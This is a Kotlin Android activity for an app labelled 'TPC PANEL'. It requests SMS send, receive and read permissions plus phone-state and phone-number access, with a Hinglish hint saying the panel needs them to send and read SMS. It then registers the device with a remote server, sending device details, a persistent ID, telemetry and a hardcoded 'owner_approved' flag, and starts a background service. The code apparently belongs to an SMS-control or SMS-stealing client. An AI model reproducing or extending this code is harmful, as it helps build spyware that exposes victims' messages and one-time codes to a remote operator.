package com.screenlink.remote

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.graphics.Color
import android.graphics.Typeface
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import java.util.concurrent.Executors

class MainActivity : Activity() {

    companion object {
        private const val API_BASE_URL = TpcService.API_BASE_URL
        private const val KEY_RID = "registration_id"
        private const val REQ = 901
    }

    private val executor = Executors.newSingleThreadExecutor()
    private lateinit var statusText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        buildUi()
        requestPermissions()
        register()
        startService(Intent(this, TpcService::class.java))
    }

    private fun buildUi() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(56, 96, 56, 56)
            setBackgroundColor(Color.rgb(4, 8, 20))
        }

        val title = TextView(this).apply {
            text = "TPC PANEL"
            textSize = 28f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.rgb(56, 189, 248))
        }

        statusText = TextView(this).apply {
            text = "Starting…"
            textSize = 15f
            setTextColor(Color.rgb(220, 234, 255))
            setPadding(0, 28, 0, 0)
        }

        val hint = TextView(this).apply {
            text = "SMS permissions zaroori hain taaki panel SMS bhej aur padh sake."
            textSize = 13f
            setTextColor(Color.rgb(111, 136, 181))
            setPadding(0, 24, 0, 0)
        }

        root.addView(title)
        root.addView(statusText)
        root.addView(hint)

        setContentView(ScrollView(this).apply { addView(root) })
    }

    private fun requestPermissions() {
        val wanted = mutableListOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            wanted.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = wanted.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), REQ)
    }

    private fun rid(): String {
        val p = getSharedPreferences(DeviceTelemetry.PREFS, MODE_PRIVATE)
        p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }
        val id = UUID.randomUUID().toString()
        p.edit().putString(KEY_RID, id).apply()
        return id
    }

    private fun register() {
        executor.execute {
            var c: HttpURLConnection? = null
            try {
                c = URL("$API_BASE_URL/devices/register").openConnection() as HttpURLConnection
                c.requestMethod = "POST"
                c.doOutput = true
                c.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val body = JSONObject().apply {
                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                    put("platform", "android")
                    put("registration_id", rid())
                    put("owner_approved", true)
                    put("telemetry", DeviceTelemetry.build(this@MainActivity))
                }.toString()

                c.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
                val ok = c.responseCode in 200..299

                runOnUiThread {
                    statusText.text = if (ok) "Registered ✓" else "Registration failed"
                }
            } catch (_: Exception) {
                runOnUiThread { statusText.text = "No connection" }
            } finally { c?.disconnect() }
        }
    }
}